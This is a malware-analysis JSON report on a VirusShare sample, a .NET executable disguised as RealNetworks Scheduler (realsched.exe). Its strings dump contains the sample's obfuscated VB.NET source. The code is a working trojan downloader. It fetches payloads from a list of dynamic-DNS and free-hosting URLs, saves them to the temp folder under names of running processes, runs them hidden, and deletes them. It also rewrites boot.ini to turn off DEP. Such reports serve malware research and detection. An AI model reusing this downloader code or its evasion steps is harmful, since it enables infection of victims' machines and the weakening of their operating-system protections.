{
    "docinfo": {},
    "filename": "VirusShare_0baf56f605a0282c84253a640315728a",
    "filesize": 82948,
    "filetype": "PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows",
    "hashes": {
        "md5": "0baf56f605a0282c84253a640315728a",
        "sha1": "b15ad1df7667c2386403fe2f2df2ce6e8af189bf",
        "sha256": "6fb0ec2caccf66784938ee50d98aa4dc929e563d1e2420dcec92958ddf5c0bb5"
    },
    "peinfo": {
        "behavior": [
            "Xor",
            "network_dyndns"
        ],
        "breakpoint": [],
        "directories": {
            "debug": {},
            "export": [],
            "import": {
                "mscoree.dll": [
                    {
                        "function": "_CorExeMain",
                        "offset": 4202496
                    }
                ]
            },
            "relocations": {
                "Size": 12,
                "VirtualAddress": 98304,
                "count": 1,
                "details": {
                    "reloc_1": 2
                }
            },
            "resources": [
                {
                    "data": "b'\\xb4\\x034\\x00\\x00\\x00V\\x00S\\x00_\\x00V\\x00E\\x00R\\x00S\\x00I\\x00O\\x00N\\x00_\\x00I\\x00N\\x00F\\x00O\\x00\\x00\\x00\\x00\\x00\\xbd\\x04\\xef\\xfe\\x00\\x00\\x01\\x00\\x01\\x00'",
                    "executable": false,
                    "language": "LANG_ENGLISH",
                    "name": "RT_VERSION",
                    "offset": 90200,
                    "size": 948,
                    "sublanguage": "SUBLANG_ENGLISH_US"
                }
            ],
            "sign": {},
            "tls": {
                "AddressOfCallBacks": 65535,
                "AddressOfIndex": 4,
                "Characteristics": 0,
                "EndAddressOfRawData": 3,
                "SizeOfZeroFill": 184,
                "StartAddressOfRawData": 9460301
            }
        },
        "dll": false,
        "entrypoint": 88350,
        "features": {
            "antidbg": [],
            "antivm": {},
            "crypto": [
                "Big_Numbers1"
            ],
            "mutex": [],
            "packer": [
                "Microsoft_Visual_Studio_NET",
                "Microsoft_Visual_C_v70_Basic_NET_additional",
                "Microsoft_Visual_C_Basic_NET",
                "Microsoft_Visual_Studio_NET_additional",
                "Microsoft_Visual_C_v70_Basic_NET",
                "NET_executable_",
                "NET_executable"
            ],
            "xor": {}
        },
        "imagebase": 4194304,
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "metadata": {
            "CompanyName": "RealNetworks, Inc.",
            "FileDescription": "RealNetworks Scheduler",
            "FileVersion": "0.1.1.868",
            "InternalName": "schedapp",
            "LegalCopyright": "Copyright \u00a9 RealNetworks, Inc. 1995-2009",
            "LegalTrademarks": "RealAudio(tm) is a trademark of RealNetworks, Inc.",
            "OriginalFilename": "realsched.exe",
            "ProductName": "RealPlayer (32-bit) ",
            "ProductVersion": "0.1.1.868"
        },
        "sections": {
            "count": 3,
            "details": [
                {
                    "characteristics": 1610612768,
                    "data": "b'\\x00Y\\x01\\x00\\x00\\x00\\x00\\x00H\\x00\\x00\\x00\\x02\\x",
                    "entropy": 5.676995609450453,
                    "executable": true,
                    "hash": {
                        "md5": "7c343760f8bc64e0bb45ddc05fd9d687",
                        "sha1": "0cae16127fe9c4a0e64e69428bcdcc6967b94588",
                        "sha256": "66f9022708f2cff62b485ff95a0a7f821246423d97914a9fcb0f81499f7268ab"
                    },
                    "section_name": ".text",
                    "size_of_raw_data": 80384,
                    "virtual_address": 8192,
                    "virtual_size": 80164
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                    "entropy": 2.4755315541173086,
                    "executable": false,
                    "hash": {
                        "md5": "a3185ff0f450f319637a13625f209529",
                        "sha1": "6c433be02f782a9e6f122a1941f28ba851d264f6",
                        "sha256": "86a8fbe61300aa103c6f2128e2d3186c7648762d757a84bfae659920e25a30f6"
                    },
                    "section_name": ".rsrc",
                    "size_of_raw_data": 1536,
                    "virtual_address": 90112,
                    "virtual_size": 1036
                },
                {
                    "characteristics": 1107296320,
                    "data": "b'\\x00P\\x01\\x00\\x0c\\x00\\x00\\x00 9\\x00\\x00\\x00\\x00\\",
                    "entropy": 0.10191042566270775,
                    "executable": false,
                    "hash": {
                        "md5": "2436adbc299f8fd875e2738b4ad9b297",
                        "sha1": "2860190da855367b3a08be0d13a7fa8b204b1e9a",
                        "sha256": "3da71b79a260fbdd58bb09b281d55aa5a566fd9b3d841fc5647c60e850e45e7b"
                    },
                    "section_name": ".reloc",
                    "size_of_raw_data": 512,
                    "virtual_address": 98304,
                    "virtual_size": 12
                }
            ]
        },
        "timestamp": "2011-10-30 21:15:16"
    },
    "strings": {
        "dump": [
            "L!This program cannot be run in DOS mode.",
            ".text",
            "`.rsrc",
            "@.reloc",
            "' quUJGzSPmIgmiuxMhjsDxaqJdwqgMVVUZKDKoCBRUXPnDvfOQk",
            "' NRfpLYMxZvtWEVHLlLWQifDYwplwOcxlvTOrsZtyHwcllkpMTa",
            "Imports Microsoft.VisualBasic",
            "Imports System",
            "Imports System.Threading",
            "' FSRhknfETMvegBdivsboOOpxLmGlKbCcnhziFozGCNetBCMjeI",
            "Module CQlZjHCfgNhmukQZZYdz",
            "' vciCKzfaaZePWdtUUjZcUsWBygVpgXkuedRRsBNpJoMeqecWol",
            "    Const IrDIEQhiEFOmTwMsySaQvqrpufYfKkWmqskKmRCwlGwnBMuthT As Integer = 30 's",
            "\tConst uRdrZqcgHusmFCYuTYVgjyUVeojNcvPidSxHIGLvowanmDHJBa As Integer = 30 's",
            "    Const UNwehCeiwHcpcPqMLnVmYcCcnhzwUpOGCOftPDMkeIKqLQYOtD As Integer = 60 * 60 's",
            "    Dim DCGdkrWiixCFwVkdNuxSuyNKsGffHPbEXDasSsExQzWGRWTevK As New System.Collections.ArrayList()\t",
            "    Dim EGPmhLNtzTbQvrrqugmuLlkBqtlKnSQxmHwnCMuuhiJSeHaFdv As String = \"e6ab9f31a482f4c5bbe3315f0b7e0ef0\"",
            "' thfZroLuGLITklHIRpWzPvCVdTytusxibjNoZptvnNpUFBoKzq",
            "    Public Sub FPxxkXxUhvctgkKxvpIFbxWcYjmCXYirmQfyTlgWCKLJOzszdq()",
            "\t\tDCGdkrWiixCFwVkdNuxSuyNKsGffHPbEXDasSsExQzWGRWTevK.AddRange(Split(\"http://ps2tissuskh2.byethost11.com/a.php?hash=all,http://vu6sabeydig1su.no-ip.org/a.php?hash=all,http://amp5eqambsyz4o.no-ip.org/a.php?hash=all,http://hohepasnorri.dyndns.org/a.php?hash=all,http://hohepasnorri.shorturl.com/a.php?hash=all,http://hesiodephesius.byethost11.com/a.php?hash=all,http://yvohaik.dyndns.org/a.php?hash=all,http://yvohaik.filetap.com/a.php?hash=all,http://vasileaviyah.servebeer.com/a.php?hash=all,http://tatianusvincent.byethost11.com/a.php?hash=all,http://liboriobo.dyndns.org/a.php?hash=all,http://eustachuspyotr.zapto.org/a.php?hash=all,http://vladimiradelbert.byethost11.com/a.php?hash=all\", \",\"))",
            "    End Sub",
            "' jowmSbbZeCJQuHHWadVtJClTWqTXlhReEEfnzcvbyRqRcWoYue",
            "' bhdoGVcenLGjlSYrzoUQQOTFLSjKJZPSKiMqoWLfVMakTTGGhq",
            "\tPublic Sub Main()",
            "\t\tCall HOsGFVYbTrHzjSUoRWjg()",
            "\tEnd Sub",
            "    Public Sub HOsGFVYbTrHzjSUoRWjg()",
            "        Dim stime As System.DateTime = System.DateTime.Now",
            "        Call FPxxkXxUhvctgkKxvpIFbxWcYjmCXYirmQfyTlgWCKLJOzszdq()\t' FPxxkXxUhvctgkKxvpIFbxWcYjmCXYirmQfyTlgWCKLJOzszdq",
            "' BlelQdcsvyqPeXHprMotHRmznZBXWxfwimNmxrKIezYRNYpEaN",
            "        Dim aTimer As System.Timers.Timer = New System.Timers.Timer(UNwehCeiwHcpcPqMLnVmYcCcnhzwUpOGCOftPDMkeIKqLQYOtD * 1000)",
            "        AddHandler aTimer.Elapsed, AddressOf HBTDZJUaWhyNVWgEycdKRjrhNIJHMxELbDCSILCbEjgPDYOFTd",
            "        aTimer.Enabled = True",
            "        aTimer.AutoReset = False",
            "' MMyyaivXrWuMYNKEWTpZkqmxPQlmwUBeubhBJxdZZXcOHOsTFU",
            "        Dim YbTrVzjfUoeVjtccPCdyMaIZLPodaUmjHcBHDPSgCENXRuLdxR As System.Threading.Mutex = New System.Threading.Mutex(False, EGPmhLNtzTbQvrrqugmuLlkBqtlKnSQxmHwnCMuuhiJSeHaFdv)",
            "        If Not YbTrVzjfUoeVjtccPCdyMaIZLPodaUmjHcBHDPSgCENXRuLdxR.WaitOne(IrDIEQhiEFOmTwMsySaQvqrpufYfKkWmqskKmRCwlGwnBMuthT * 1000, False) Then",
            "\t\t\tCall YbTrVzjfUoeVjtccPCdyMaIZLPodaUmjHcBHDPSgCENXRuLdxR.ReleaseMutex()",
            "\t\t\tCall HBTDZJUaWhyNVWgEycdKRjrhNIJHMxELbDCSILCbEjgPDYOFTd()\t' pTjCWpjZFOOMRDvDhttJNQIgvoYGJdGKYiEREqSomPwOzEdEPJ",
            "\t\t\tExit Sub",
            "        End If",
            "\t\tCall bYvRphepHVqenMGjlSmrzpVeediFMTxLKadgYwMFoXZtWaolUh.HHiqDfyeDUuUfZrbxhsyuGXltuFcXBCioIQGlghfkVcjzbaqgi()           ' HHiqDfyeDUuUfZrbxhsyuGXltuFcXBCioIQGlghfkVcjzbaqgi",
            "\t\tWhile Not IsConnectionAvailable()\t' ojjinYRYDdPfildCfKtpeypgtEnmaMnKWkSjVZznlfxuRmLRNZ",
            "            System.Threading.Thread.Sleep(IrDIEQhiEFOmTwMsySaQvqrpufYfKkWmqskKmRCwlGwnBMuthT * 1000)",
            "        End While",
            "' lpQqCvOLhEcUQbsIdRaxsWYFYembHQRPUrxFjwvMQSKjyqbJLf",
            "        Call INbXGTssUdpRlQoHgHSMeNkUekgsJYfhqOJmoVbuDrXTTSXIPW() ",
            "\t\tSystem.Threading.Thread.Sleep(180 * 1000)",
            "' fGFVLOGeImkSHbRIWgPPCCdmyauZxQbQNHZWtdntpCSToqzXEh",
            "        YbTrVzjfUoeVjtccPCdyMaIZLPodaUmjHcBHDPSgCENXRuLdxR.ReleaseMutex()",
            "        Exit Sub",
            "    End Sub",
            "' KfEKGSVjFHQaVxOgBUOEjssrwhahMZYorumLaTDlnIkpDNivjV",
            "' iFEgNfRVuVgaspMiHyuHXmIvFcXBDjEJRHmuvtyWdkPbaquxoO",
            "    Public Sub HBTDZJUaWhyNVWgEycdKRjrhNIJHMxELbDCSILCbEjgPDYOFTd()",
            "\t\tHBTDZJUaWhyNVWgEycdKRjrhNIJHMxELbDCSILCbEjgPDYOFTd(Nothing, Nothing)",
            "\tEnd Sub",
            "    Public Sub HBTDZJUaWhyNVWgEycdKRjrhNIJHMxELbDCSILCbEjgPDYOFTd(ByVal sender As Object, ByVal e As System.Timers.ElapsedEventArgs)",
            "\t\tDim DqoiBxUqPURcfuQRakfJYrLeZOtDECHrksWjiyDFwWldOvxSuz As System.Diagnostics.Process = System.Diagnostics.Process.GetCurrentProcess()",
            "        DqoiBxUqPURcfuQRakfJYrLeZOtDECHrksWjiyDFwWldOvxSuz.Kill()",
            "    End Sub",
            "' yPTWNmCteMOjMQeaJXwwqyLnHmKcCcnhzjGpBGDOftCDMkfIKq",
            "    Public Function INbXGTssUdpRlQoHgHSMeNkUekgsJYfhqOJmoVbuDrXTTSXIPW() As Boolean",
            "        For Each RXTevwSTdBhLaHNgoeKFGEJtnuYzkBFHyYBfQMzVLCQaJJviJf As String In DCGdkrWiixCFwVkdNuxSuyNKsGffHPbEXDasSsExQzWGRWTevK",
            "            If FmoKmqFPjxkXxUTvcugkKkvpIFbxWOKWmCXLUrmQSyTYgWCKLJ(RXTevwSTdBhLaHNgoeKFGEJtnuYzkBFHyYBfQMzVLCQaJJviJf, 10 * 1024) Then",
            "\t\t\t\tTry",
            "' XupTVCIbjYEzzxDouCTtsJyCtSvaYGuPFvKUDDppRZmOiNlDPE",
            "                    Dim BuNKhRbhdpGHcenLrVlSYrzoUQQPTFxFjKvMPSKiMqaWLfVMak As System.Net.WebClient = New System.Net.WebClient",
            "\t\t\t\t\tDim TTGsUqDRyQCGfURLdaxTrxtGJXsuEOJlCUoICrXggfkVOVzNMc() As Byte = BuNKhRbhdpGHcenLrVlSYrzoUQQPTFxFjKvMPSKiMqaWLfVMak.DownloadData(RXTevwSTdBhLaHNgoeKFGEJtnuYzkBFHyYBfQMzVLCQaJJviJf)",
            "                    Dim GRiwFGQniMNtBTbRwrsqvgnuLmlCrulLnTQymIxoDNvviiKSfH As String = aGevIwtnGDZJUaWhyzVWgEkOeKRkrhNIJHMxqxcDoEILCbEjTP()",
            "                    System.IO.File.WriteAllBytes(GRiwFGQniMNtBTbRwrsqvgnuLmlCrulLnTQymIxoDNvviiKSfH, TTGsUqDRyQCGfURLdaxTrxtGJXsuEOJlCUoICrXggfkVOVzNMc)",
            "' EhjQjpxmSbcafDJRuIHXbdVuKCmUWqTYmiReEFfoBdwbzSrSdX",
            "\t\t\t\t\tDim pYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh As System.IO.FileInfo",
            "\t\t\t\t\tpYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh = New System.IO.FileInfo(GRiwFGQniMNtBTbRwrsqvgnuLmlCrulLnTQymIxoDNvviiKSfH)",
            "' oxxvBmfmRddswzrQfYIpsNptISnBnaCXWygxjnNnysLIfBZROZ",
            "                    Dim qFaOXvpTVCWbjZFOONRovDhttKNQIgvoYGJdGKYVERqqSamPiO As New System.Diagnostics.ProcessStartInfo",
            "                    qFaOXvpTVCWbjZFOONRovDhttKNQIgvoYGJdGKYVERqqSamPiO.FileName = GRiwFGQniMNtBTbRwrsqvgnuLmlCrulLnTQymIxoDNvviiKSfH",
            "                    qFaOXvpTVCWbjZFOONRovDhttKNQIgvoYGJdGKYVERqqSamPiO.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden",
            "                    Dim FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxu As System.Diagnostics.Process = System.Diagnostics.Process.Start(qFaOXvpTVCWbjZFOONRovDhttKNQIgvoYGJdGKYVERqqSamPiO)",
            "' ENZBVzYqQqCvOwUEOUQcsIPRaxsWYFLembHDDCHrxGWwvMCFwV",
            "                    FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxu.WaitForExit(300 * 1000)",
            "                    If Not FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxu.HasExited Then FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxu.Kill()",
            "                    FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxu.Close()",
            "\t\t\t\t\t",
            "' DzivVVwFStOsRiJjuoHpMvHNJUlBIJTqlPRxEXfUzvvtykqxPp",
            "                    System.Threading.Thread.Sleep(2000)",
            "                    System.IO.File.Delete(GRiwFGQniMNtBTbRwrsqvgnuLmlCrulLnTQymIxoDNvviiKSfH)",
            "                    Return True",
            "                Catch ex As System.Exception",
            "' GZhXDxywCmfmRrdtxzrRtYJEsNEuITCBoaCYkygxkoOCztMJfC",
            "                End Try",
            "            End If",
            "        Next",
            "        Return False",
            "    End Function",
            "    Public Function FmoKmqFPjxkXxUTvcugkKkvpIFbxWOKWmCXLUrmQSyTYgWCKLJ(ByVal RXTevwSTdBhLaHNgoeKFGEJtnuYzkBFHyYBfQMzVLCQaJJviJf As String, ByVal pXZuXbplUiIIirEgzfDVuVgascyisyuHYmuvFcXBDjpJRHmhig As Integer) As Boolean",
            "        Try",
            "            Dim XJPWnONdTWNmPusaPjZQeoXXKKltHiDhGXjYVPheBkvCxJabwy As System.Net.HttpWebRequest = DirectCast(System.Net.HttpWebRequest.Create(RXTevwSTdBhLaHNgoeKFGEJtnuYzkBFHyYBfQMzVLCQaJJviJf), System.Net.HttpWebRequest)",
            "            XJPWnONdTWNmPusaPjZQeoXXKKltHiDhGXjYVPheBkvCxJabwy.Method = \"HEAD\"",
            "            XJPWnONdTWNmPusaPjZQeoXXKKltHiDhGXjYVPheBkvCxJabwy.Timeout = 60 * 1000",
            "            XJPWnONdTWNmPusaPjZQeoXXKKltHiDhGXjYVPheBkvCxJabwy.AllowAutoRedirect = True",
            "            Dim pfLGGFKuCJZzyPFIzYCgeMBVMDQaKJwwXgsVoUrKWKICURnXhn As System.Net.HttpWebResponse = DirectCast(XJPWnONdTWNmPusaPjZQeoXXKKltHiDhGXjYVPheBkvCxJabwy.GetResponse(), System.Net.HttpWebResponse)",
            "            If pfLGGFKuCJZzyPFIzYCgeMBVMDQaKJwwXgsVoUrKWKICURnXhn.ContentLength < pXZuXbplUiIIirEgzfDVuVgascyisyuHYmuvFcXBDjpJRHmhig Then Return False",
            "            If pfLGGFKuCJZzyPFIzYCgeMBVMDQaKJwwXgsVoUrKWKICURnXhn.StatusCode = \"404\" Then Return False",
            "\t\t\tReturn True",
            "        Catch ex As System.Exception",
            "            Return False",
            "        End Try",
            "    End Function",
            "    Public Function aGevIwtnGDZJUaWhyzVWgEkOeKRkrhNIJHMxqxcDoEILCbEjTP() As String",
            "\t\tDim MJgQagcoFGbdmKrVkRXqynUPPOTEwEiJuLORJhLpZVKeVMZjSS As String",
            "\t\tTry",
            "\t\t\tDim GrTpCQxPBFfTQKcawSqwsFIWstDNIlBTnHBqWfgejUNUyMLbeh As New System.Collections.ArrayList()",
            "\t\t\tFor Each FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuess As System.Diagnostics.Process In System.Diagnostics.Process.GetProcesses()",
            "\t\t\t\tIf FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuess.MainWindowTitle = \"\" Then Continue For",
            "\t\t\t\tIf FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuess.ProcessName.Length < 5 Then Continue For",
            "\t\t\t\tGrTpCQxPBFfTQKcawSqwsFIWstDNIlBTnHBqWfgejUNUyMLbeh.Add(FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuess.ProcessName)",
            "\t\t\tNext",
            "\t\t\tDim Rand As New System.Random()",
            "\t\t\tDim lxwNRULkzscKNhKOcmIVIuVrqTBSEIhITNfcyVtlhtLZuirPKn As Integer = Rand.Next(0, GrTpCQxPBFfTQKcawSqwsFIWstDNIlBTnHBqWfgejUNUyMLbeh.Count - 1)",
            "\t\t\tDim oYiokvNcjluSNqsZfyHvbXXWaMSZqRQgWZRpTxvdSmcThraaNN As String = GrTpCQxPBFfTQKcawSqwsFIWstDNIlBTnHBqWfgejUNUyMLbeh(lxwNRULkzscKNhKOcmIVIuVrqTBSEIhITNfcyVtlhtLZuirPKn)",
            "\t\t\tMJgQagcoFGbdmKrVkRXqynUPPOTEwEiJuLORJhLpZVKeVMZjSS = System.Environment.GetEnvironmentVariable(\"temp\") & \"\\~\" & oYiokvNcjluSNqsZfyHvbXXWaMSZqRQgWZRpTxvdSmcThraaNN & \".exe\"",
            "' WwICUEaKVaWizOWXgFyceLRksiOJKINxFMcDDSJLDcFjhPEYPG",
            "\t\tCatch ex As System.Exception",
            "\t\t\tMJgQagcoFGbdmKrVkRXqynUPPOTEwEiJuLORJhLpZVKeVMZjSS = System.IO.Path.GetTempFileName.Replace(\".tmp\", \".exe\")",
            "' FVZbTsVzkgUofWkudcQDdzMbIZMQpdbVnkHdCIEPShDEOXSvLe",
            "        End Try",
            "\t\tTry",
            "\t\t\tDim pYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh As New System.IO.FileInfo(MJgQagcoFGbdmKrVkRXqynUPPOTEwEiJuLORJhLpZVKeVMZjSS)",
            "\t\t\tIf Not pYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.Directory.Exists Then pYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.Directory.Create()",
            "\t\t\tIf pYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.Exists Then ",
            "\t\t\t\tpYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.Attributes = System.IO.FileAttributes.Normal",
            "\t\t\t\tpYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.Delete()",
            "\t\t\tEnd If",
            "\t\tCatch ex As System.Exception",
            "' BPooPYkNgMjCbCNHZIfPZfbnETaclJEhjQWpxnTOONSDKRhIIX",
            "        End Try",
            "\t\tReturn MJgQagcoFGbdmKrVkRXqynUPPOTEwEiJuLORJhLpZVKeVMZjSS",
            "    End Function",
            "    Public Function IsConnectionAvailable() As Boolean",
            "        Try",
            "\t\t\tDim BpVRRPUGyGkLwMQTLjMrbXMgWNblUUHtVqESzRDHgVSMebyUsy As System.Net.WebRequest = System.Net.WebRequest.Create(\"http://www.google.com/\")",
            "\t\t\tBpVRRPUGyGkLwMQTLjMrbXMgWNblUUHtVqESzRDHgVSMebyUsy.Timeout = uRdrZqcgHusmFCYuTYVgjyUVeojNcvPidSxHIGLvowanmDHJBa * 1000",
            "\t\t\tDim eybguqZnMNnwJlFjIazalfxgEnxEzMcryBKhcGIouOWLrmmlqb As System.Net.WebResponse",
            "            eybguqZnMNnwJlFjIazalfxgEnxEzMcryBKhcGIouOWLrmmlqb = BpVRRPUGyGkLwMQTLjMrbXMgWNblUUHtVqESzRDHgVSMebyUsy.GetResponse",
            "            eybguqZnMNnwJlFjIazalfxgEnxEzMcryBKhcGIouOWLrmmlqb.Close()",
            "            Return True",
            "        Catch ex As System.Exception",
            "\t\t\tReturn False",
            "        End Try",
            "    End Function",
            "' KvXtsUCTFKcDOIaXtPngcnFUpcmKFikQkqynTcdbgEKRvJIYce",
            "\tPublic Class bYvRphepHVqenMGjlSmrzpVeediFMTxLKadgYwMFoXZtWaolUh",
            "\t\tPublic Shared Function jffeiUahyZYoehZxbGElaukbpziiVWwGStOsRjujgaspNwHNJV() As Boolean",
            "\t\t\tTry",
            "\t\t\t\tIf System.Environment.GetEnvironmentVariable(\"ProgramW6432\").Length > 0 Then ",
            "\t\t\t\t\tReturn True",
            "\t\t\t\tElse ",
            "\t\t\t\t\tReturn False",
            "\t\t\t\tEnd If\t\t\t\t",
            "\t\t\tCatch ex As System.Exception",
            "' lmIKTqYBRxEXfUzvvuzkdkPpbruxpOrWGCqLCsGQyymYzWiwev",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "\t\tPublic Shared Function FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuStart(ByVal quJTnCobCYXzgykoOoztMJfCaSOaqGbPYvqUWDXckaGPPNSpwE As String, Optional ByVal UhgwzDuTibMtvQsxLIqEddFNaCWBZqRrDwPxUEPVRctJQSbytX As String = \"\", Optional ByVal ZGMfncIEECHsyGXxwNDGxWzecKyTJzOYHHttVdqSmRpHTIFyRO As Boolean = True, Optional ByVal lVflhtKLgirPvZpWcvEsYUUTYJCJnOzQTWOmQueaPjZQeoXXKw As Integer = 0 ) As Boolean",
            "\t\t\tDim KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQp As System.Diagnostics.Process = New System.Diagnostics.Process",
            "\t\t\tDim KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpSI As System.Diagnostics.ProcessStartInfo = New System.Diagnostics.ProcessStartInfo",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpSI.FileName = quJTnCobCYXzgykoOoztMJfCaSOaqGbPYvqUWDXckaGPPNSpwE",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpSI.Arguments = UhgwzDuTibMtvQsxLIqEddFNaCWBZqRrDwPxUEPVRctJQSbytX",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpSI.CreateNoWindow = True",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpSI.UseShellExecute = True",
            "\t\t\tIf ZGMfncIEECHsyGXxwNDGxWzecKyTJzOYHHttVdqSmRpHTIFyRO Then",
            "\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden",
            "\t\t\tElse",
            "\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal",
            "\t\t\tEnd If",
            "\t\t\tTry",
            "\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQp.StartInfo = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpSI",
            "\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQp.Start()",
            "\t\t\t\tIf lVflhtKLgirPvZpWcvEsYUUTYJCJnOzQTWOmQueaPjZQeoXXKw = 0 Then",
            "' kneEgMvrgBqhvGoobOoLYmUlXbBpmgyvSoNTPaesOQZidHXpKd",
            "\t\t\t\tElse If lVflhtKLgirPvZpWcvEsYUUTYJCJnOzQTWOmQueaPjZQeoXXKw = -1 Then",
            "\t\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQp.WaitForExit()",
            "\t\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQp.Close()",
            "\t\t\t\tElse",
            "\t\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQp.WaitForExit(lVflhtKLgirPvZpWcvEsYUUTYJCJnOzQTWOmQueaPjZQeoXXKw)",
            "\t\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQp.Close()",
            "\t\t\t\tEnd If",
            "\t\t\t\tReturn True",
            "\t\t\tCatch ex As System.Exception",
            "' nkHdCtpCThDqzXSvxeyEMChqqptRYfKWWlpskJYRBilGimBxgt",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "\t\tPublic Shared Function TTuDPrLqOgGgrlEnKtFKHSjxGHQojMOuBUcSxstrwhovMnmDsu() As Boolean",
            "\t\t\tIf mMoTRznIypEOwvjjLTfIbzXpCpnhzwTDOTQbstPQZxeIXEKdlb() Then Return False",
            "\t\t\tDim HCDBGqjqVvhxCEvVxcNIwRIyMXGFseGcoDkCosSGExQNjGejgr As String = Environment.SystemDirectory(0) & \":\\boot.ini\"",
            "\t\t\tTry",
            "\t\t\t\tDim pYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh As New System.IO.FileInfo(HCDBGqjqVvhxCEvVxcNIwRIyMXGFseGcoDkCosSGExQNjGejgr)",
            "\t\t\t\tIf pYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.Exists Then",
            "\t\t\t\t\tpYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.Attributes = System.IO.FileAttributes.Normal",
            "\t\t\t\t\tDim KqwQYNsoonrdWdIiUjnqiHkPyujEtkyJrreRsPbpXoaeEspjCy As String = System.IO.File.ReadAllText(pYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.FullName)",
            "\t\t\t\t\tKqwQYNsoonrdWdIiUjnqiHkPyujEtkyJrreRsPbpXoaeEspjCy = KqwQYNsoonrdWdIiUjnqiHkPyujEtkyJrreRsPbpXoaeEspjCy.Replace(\"optin\", \"AlwaysOff\")",
            "\t\t\t\t\tDim KJOyGNdEETJMEcGkiQFZQHUeONBBbkwZsYvOaOMGYVrblrnzRS As System.IO.StreamWriter = New System.IO.StreamWriter(HCDBGqjqVvhxCEvVxcNIwRIyMXGFseGcoDkCosSGExQNjGejgr)",
            "\t\t\t\t\tKJOyGNdEETJMEcGkiQFZQHUeONBBbkwZsYvOaOMGYVrblrnzRS.Write(KqwQYNsoonrdWdIiUjnqiHkPyujEtkyJrreRsPbpXoaeEspjCy)",
            "\t\t\t\t\tKJOyGNdEETJMEcGkiQFZQHUeONBBbkwZsYvOaOMGYVrblrnzRS.Close()",
            "\t\t\t\t\tpYvfpvrEUjqsCZUxzgmGODjeediTahxYXndgYwaFDkZtkboyhh.Attributes = System.IO.FileAttributes.System Or System.IO.FileAttributes.Hidden Or System.IO.FileAttributes.ReadOnly",
            "\t\t\t\tEnd If",
            "\t\t\t\tReturn True",
            "\t\t\tCatch ex As System.Exception",
            "' YealDEZakIoSiOVovlRNNLQCuCgHsIMPHfInXTIcSJXhQQDpRm",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "\t\tPublic Shared Function zOvNyDcROIaXuQouqCGUprBLFiyRlFyoUddcgSLSwJJYcfXvLE(Byval GoqLnsGQlymYzWVwevhlMlxrJHdyXQMXoEZMWtoSUzUZhXDMNL As System.IO.FileSystemInfo) As Boolean",
            "\t\t\tTry",
            "\t\t\t\tIf GoqLnsGQlymYzWVwevhlMlxrJHdyXQMXoEZMWtoSUzUZhXDMNL.Exists Then",
            "' mKFikRXqynTPPOSEKRiJIYORJhLpnVKeULZjSSFFgpCdxcBTeT",
            "\t\t\t\t\tIf GoqLnsGQlymYzWVwevhlMlxrJHdyXQMXoEZMWtoSUzUZhXDMNL.GetType().ToString().Contains(\"FileInfo\") Then",
